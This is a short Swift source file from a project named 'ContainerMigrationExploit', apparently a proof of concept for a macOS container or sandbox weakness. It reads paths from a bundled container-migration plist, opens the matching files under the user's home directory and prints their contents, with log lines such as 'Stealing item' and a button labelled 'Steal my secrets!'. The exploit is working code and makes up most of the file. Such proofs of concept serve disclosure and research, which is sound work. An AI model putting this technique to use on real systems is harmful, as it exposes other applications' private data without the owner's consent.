//
//  ContentView.swift
//  ContainerMigrationExploit
//
//  Created by Pedro José Pereira Vieito on 12/3/24.
//

import SwiftUI

struct ContentView: View {
    var body: some View {
        VStack {
            Button {
                Task {
                    let containerMigrationPlistURL = Bundle.main.url(forResource: "container-migration", withExtension: "plist")!
                    let containerMigrationPlistData = try! Data(contentsOf: containerMigrationPlistURL)
                    let containerMigrationPlist = try! PropertyListSerialization.propertyList(from: containerMigrationPlistData, format: nil) as! [String: [Any]]
                    
                    for itemPath in containerMigrationPlist["Move"]! {
                        do {
                            var itemPath = itemPath as? String ?? (itemPath as? [String])!.last!
                            itemPath = itemPath.replacingOccurrences(of: "${Home}/", with: "")
                            let secretFile = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent(itemPath)
                            print("[!] Stealing item at “\(itemPath)” (from path: “\(secretFile.path)”)…")
                            let secret = try Data(contentsOf: secretFile)
                            print("[*] Content: \(secret)")
                        }
                        catch {
                            print("[x] \(error.localizedDescription)")
                        }
                    }
                }
            } label: {
                Image(systemName: "globe")
                    .imageScale(.large)
                    .foregroundStyle(.tint)
                Text("Steal my secrets!")
            }
        }
        .padding()
    }
}

#Preview {
    ContentView()
}
